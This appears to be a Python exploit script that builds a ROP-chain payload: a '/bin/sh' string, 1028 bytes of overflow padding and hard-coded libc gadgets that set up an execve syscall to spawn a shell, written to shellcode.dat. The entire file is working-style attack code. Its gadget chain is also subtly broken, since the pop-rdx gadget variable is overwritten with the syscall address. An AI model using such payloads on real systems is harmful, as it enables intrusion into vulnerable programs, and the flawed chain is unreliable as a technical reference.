#!/usr/bin/python

import struct
import binascii

LIBC_OFFSET = 0x7ffff7a3a000
g1 = LIBC_OFFSET + 0xe76fa # pop rax ; ret
d1 = 59
g2 = LIBC_OFFSET + 0x1fc1a # pop rsi ; ret
g3 = LIBC_OFFSET + 0x1b92  # pop rdx ; ret
d2 = 0

g3 = LIBC_OFFSET + 0x15a76a # syscall  (0x15a76b)

g4 = LIBC_OFFSET + 0x1fc6a # pop rdi ; ret
d3 = 0x7ffffffffe100


shellcode = struct.pack('<q', 0x0068732f6e69622f) #?

shellcode += 'A'*(1028)

shellcode += struct.pack('<q', g1) 	# pop eax; ret
shellcode += struct.pack('<q', d1)  # value to set in RAX (59)
shellcode += struct.pack('<q', g2)  # pop rsi; ret
shellcode += struct.pack('<q', d2)	# 0 for rsi 
shellcode += struct.pack('<q', g3)  # pop rdx; ret
shellcode += struct.pack('<q', d2)  # 0 for rdx
shellcode += struct.pack('<q', g4)	# pop rdi; ret
shellcode += struct.pack('<q', d3)	# 0x7ffffffffe100 for rdi
shellcode += struct.pack('<q', g3)  # syscall

#?


print ("shellcode: "+ shellcode)
with open("shellcode.dat", "wb") as f:
    f.write(shellcode)
print (binascii.hexlify(shellcode))
print ("g1: %x" % (g1))